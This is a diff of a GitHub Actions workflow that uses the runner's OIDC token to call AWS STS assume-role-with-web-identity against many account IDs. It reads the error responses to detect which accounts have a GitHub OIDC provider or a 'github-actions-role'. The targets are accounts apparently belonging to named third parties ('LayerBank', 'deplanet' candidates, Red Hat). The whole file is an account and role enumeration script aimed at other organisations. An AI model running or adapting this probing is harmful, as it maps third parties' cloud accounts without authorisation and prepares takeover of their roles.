@@ -1,4 +1,4 @@
-name: STS Oracle Calibration
+name: STS Oracle - OIDC Provider Detection
 on:
   workflow_dispatch:
 
@@ -10,50 +10,37 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: STS Oracle Calibration Test
+      - name: Test STS Oracle - OIDC Provider Detection
         run: |
           TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
-          echo "TOKEN_OBTAINED=true"
+          echo "TOKEN_OK=true"
           
-          # Print the token's claims (but not the signature)
-          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null || echo "$TOKEN" | cut -d. -f2 | python3 -c "import sys,base64; data=sys.stdin.read().strip(); print(base64.b64decode(data + '==').decode())" 2>/dev/null)
-          echo "TOKEN_CLAIMS: $PAYLOAD"
+          # Test 1: Our own account (062341577280) which NOW has GitHub OIDC provider
+          # but NO matching role - should give DIFFERENT error than "No OIDC provider"
+          R_OWN=$(aws sts assume-role-with-web-identity \
+            --role-arn "arn:aws:iam::062341577280:role/nonexistent-role-xyzzz" \
+            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+          echo "OWN_ACCT_NO_ROLE: $R_OWN"
           
-          # Test oracle with very different account ID patterns
-          # Test 1: obviously fake (000000000000)
-          R1=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::000000000000:role/test" \
-            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -1)
-          echo "FAKE_000: $R1"
+          # Test 2: Fake account
+          R_FAKE=$(aws sts assume-role-with-web-identity \
+            --role-arn "arn:aws:iam::000000000000:role/nonexistent-role-xyzzz" \
+            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+          echo "FAKE_000: $R_FAKE"
           
-          # Test 2: AWS's own account (this definitely exists)
-          # AWS account 210125452185 is an AWS-owned account (Amazon Web Services)
-          R2=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::210125452185:role/nonexistent-role-xyz-99999" \
-            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -1)
-          echo "AWS_OWN: $R2"
+          # Test 3: Our own account with a real role name (but that doesn't have the trust policy)
+          R_OWN2=$(aws sts assume-role-with-web-identity \
+            --role-arn "arn:aws:iam::062341577280:role/AWSReservedSSO_ReadOnlyAccess_abc123" \
+            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
+          echo "OWN_ACCT_REAL_ROLE_PATTERN: $R_OWN2"
           
-          # Test 3: AWS account 123456789012 (example, may not exist)
-          R3=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::123456789012:role/nonexistent-role-xyz-99999" \
-            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -1)
-          echo "EXAMPLE: $R3"
-          
-          # Test 4: Try a known AWS service account ID
-          # Amazon's corporate AWS account: 099720109477 (Canonical/Ubuntu)
-          # or 309956199498 (RedHat)
-          R4=$(aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::309956199498:role/nonexistent-role-xyz-99999" \
-            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -1)
-          echo "REDHAT_ACCT: $R4"
-          
-          # Test 5: Our best guess for LayerBank - try variants
-          for ACCT in "035065022990" "847111281529" "940202570803" "590183853468"; do
+          # Test 4: Probe deplanet candidate account IDs with github-actions roles
+          for ACCT in "940202570803" "123456789012" "035065022990"; do
             R=$(aws sts assume-role-with-web-identity \
               --role-arn "arn:aws:iam::${ACCT}:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -1)
-            echo "CANDIDATE_${ACCT}: $R"
+            echo "PROBE_${ACCT}: $R"
           done
         env:
           AWS_DEFAULT_REGION: us-east-1
